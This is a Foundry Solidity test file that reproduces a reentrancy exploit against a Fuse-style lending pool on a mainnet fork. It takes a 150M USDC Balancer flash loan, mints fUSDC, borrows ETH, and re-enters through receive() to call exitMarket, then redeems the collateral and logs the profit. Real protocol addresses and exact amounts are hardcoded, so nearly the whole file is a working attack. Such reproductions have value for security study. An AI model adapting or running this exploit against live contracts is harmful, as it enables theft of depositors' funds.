// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/HarvestFF/interfaces/IFlashLoanReceiver.sol";
import "../src/HarvestFF/interfaces/ILendingPool.sol";
import "../src/HarvestFF/interfaces/ILendingPoolAddressesProvider.sol";
import "../src/HarvestFF/interfaces/IERC20.sol";

import "../src/FairFF/interfaces/CErc20Interface.sol";
import "../src/FairFF/interfaces/ComptrollerInterface.sol";

// fork_block_number = 14684685
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IVault {
    function flashLoan(
        address receiver,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract ExploitTest is Test {

    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ComptrollerInterface unitroller = ComptrollerInterface(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);
    
    CErc20Interface fUSDC = CErc20Interface(payable(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47)); // 0xb1&#39;s Kitchen Sink USD Co... (fUSDC-127)
    CErc20Interface fDAI = CErc20Interface(payable(0x7e9cE3CAa9910cc048590801e64174957Ed41d43));
    CErc20Interface fETH = CErc20Interface(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));

    IUniswapV2Router uniswap = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // balancer protocol flash loan check
    IUSDT constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // balancer check
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; 
    IVault balancerVault = IVault(BALANCER_VAULT);

    address me;
    address ca;

    function setUp() public {
        // pk signer vm
    
        // account check
        emit log_named_address("me", address(msg.sender));
        me = address(msg.sender);
        // contract check
        emit log_named_address("this", address(this));
        ca = address(this);

        // weth approve this contract
        // WETH.approve(address(this), type(uint256).max);
        
        address[] memory cToken = new address[](1);
        cToken[0] = address(fUSDC);
        unitroller.enterMarkets(cToken);
    }

    function unwrapEther(uint256 Amount) public payable{
        address payable sender = payable(msg.sender);
    
        if (Amount != 0) {
            // IWETH(address(WETH)).transferFrom(msg.sender, address(this), Amount);
            IWETH(address(WETH)).withdraw(Amount);
            sender.transfer(address(this).balance);
        }
    }

    function testExploit() public {
        // emit log_named_decimal_uint("[Balancer] usdcAmount", address(fUSDC).balance, 6);
        // emit log_named_decimal_uint("[Balancer] wethAmount", address(fETH).balance, 6);
        // emit log_named_decimal_uint("[Balancer] daiAmount", address(fDAI).balance, 6);

        // emit log_named_decimal_uint("[Balancer] usdc balance", USDC.balanceOf(address(balancerVault)), 6);
        // emit log_named_decimal_uint("[Balancer] weth balance", WETH.balanceOf(address(balancerVault)), 6);
        // emit log_named_decimal_uint("[Balancer] dai balance", DAI.balanceOf(address(balancerVault)), 6);

        // emit log_named_decimal_uint("me", WETH.balanceOf(address(this)), 6);
        // emit log_named_decimal_uint("me", USDC.balanceOf(address(this)), 6);

        // balancer flash loan
        IERC20[] memory tokens = new IERC20[](1);
        uint256[] memory amounts = new uint256[](1);
        
        tokens[0] = USDC;
        // tokens[1] = WETH;

        amounts[0] = 150000000 * 10**6;
        // amounts[2] = wethAmount;

        sendFlashLoan(tokens, amounts);
        emit log_named_decimal_uint("[Fair::profit]", WETH.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[Fair::profit]", USDC.balanceOf(address(this)), 6);

        // weth -> eth withdraw - gas
        // unwrapEther(WETH.balanceOf(address(this)));


    }

    receive() payable external {
        // emit log_named_decimal_uint("received ether", msg.value, 6);

        unitroller.exitMarket(address(fUSDC));

        
        // sender account me eth msg.value
        emit log_named_address("sender", msg.sender);
        emit log_named_address("me", me);
        emit log_named_decimal_uint("msg.value", msg.value, 6);
        payable(me).transfer(msg.value);

    }

    function sendFlashLoan(IERC20[] memory tokens, uint256[] memory amounts) public {
        uint _tokens_len = tokens.length;
        uint _amounts_len = amounts.length;
        require(_tokens_len == _amounts_len, "tokens and amounts length mismatch");

        IERC20[] memory _tokens = new IERC20[](_tokens_len);
        uint256[] memory _amounts = new uint256[](_amounts_len);
        
        for (uint i = 0; i < _tokens_len; i++) {
            _tokens[i] = tokens[i];
            _amounts[i] = amounts[i];
        }

        balancerVault.flashLoan(address(this), _tokens, _amounts, "");
        // emit log_named_string("Balancer Flash Loan", "success");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == address(balancerVault), "BalancerFlashLoan: Callback msg.sender was not the Balancer");
        // emit log_named_address("attacker contract", address(this));
        // emit log_named_address("receve call who?", address(msg.sender));
        // emit log_named_string("Balancer Flash Loan Receive", "\n");

        // balance check
        uint256 usdcBalance = USDC.balanceOf(address(this));
        // emit log_named_decimal_uint("usdcBalance", usdcBalance, 6);
        USDC.approve(address(fUSDC), ~uint256(0));

        // msg.sedner 
        uint256 _balance = USDC.balanceOf(msg.sender);
        // emit log_named_decimal_uint("msg.sender usdc balance", _balance, 6);

        // accureInterest 0x03296d34fd6b3619a75860f44a0d2c68336708e7 
        fUSDC.accrueInterest();

        // mint
        fUSDC.mint(usdcBalance);

        uint256 fETHBalance = fETH.balanceOf(address(this));
        // emit log_named_decimal_uint("fETHBalance", fETHBalance, 6);

        usdcBalance = USDC.balanceOf(address(this));
        // emit log_named_decimal_uint("usdcBalance", usdcBalance, 6);
        
        // [call][558736][] 0x03296D34FD6B3619a75860f44a0D2C68336708e7.borrow(borrowAmount=1977579153781557429247) → (0x)
        uint256 borrowAmount = 1977579153781557429247;
        fETH.borrow(borrowAmount);
        // receive => re-enter => hack (exitMarket)

        // borrow ether balance check
        // emit log_named_decimal_uint("borrow ether balance", address(fETH).balance, 6);
        // emit log_named_decimal_uint("this ether borrow => ", address(this).balance, 6);

        uint256 new_usdcBalance = USDC.balanceOf(address(this));
        fUSDC.approve(address(fUSDC), ~uint256(0));

    
        uint256 ex_c_token = fUSDC.exchangeRateCurrent();
        // emit log_named_decimal_uint("ex_c_token", ex_c_token, 6);
        
        // [call][99597][] [CErc20Delegator].redeemUnderlying(redeemAmount=150000000000000) → (0)
        fUSDC.redeemUnderlying(150000000000000);
        
        new_usdcBalance = USDC.balanceOf(address(this));
        // emit log_named_decimal_uint("new_usdcBalance", new_usdcBalance, 6);

        // transfer repay to
        new_usdcBalance = USDC.balanceOf(address(this));
        uint256 new_fee = feeAmounts[0];
        // emit log_named_decimal_uint("new_usdcBalance", new_usdcBalance, 6);
        // emit log_named_decimal_uint("new_fee", new_fee, 6);

        tokens[0].transfer(msg.sender, new_usdcBalance + new_fee);       
    }
}
